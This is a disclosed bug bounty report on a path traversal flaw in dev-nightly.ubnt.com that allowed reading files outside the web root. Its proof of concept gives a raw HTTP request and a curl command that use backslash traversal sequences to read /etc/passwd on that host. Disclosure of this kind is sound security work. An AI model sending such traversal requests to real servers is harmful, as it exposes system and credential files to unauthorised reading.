# [dev-nightly.ubnt.com] Local File Reading

## Report Details
- **Report ID**: 260420
- **URL**: https://hackerone.com/reports/260420
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-08-15T16:51:21.285Z
- **Disclosed**: 2017-09-14T18:23:06.688Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ui

## Vulnerability Information
**Description**
Reading files outside the web root via path traversal

**PoC**
```http
GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
Host: dev-nightly.ubnt.com
```
```
curl "https://dev-nightly.ubnt.com/..\..\..\etc\passwd"
```

**Result**
{F213057}

## Attachments
- Screenshot_at_20-47-03.png
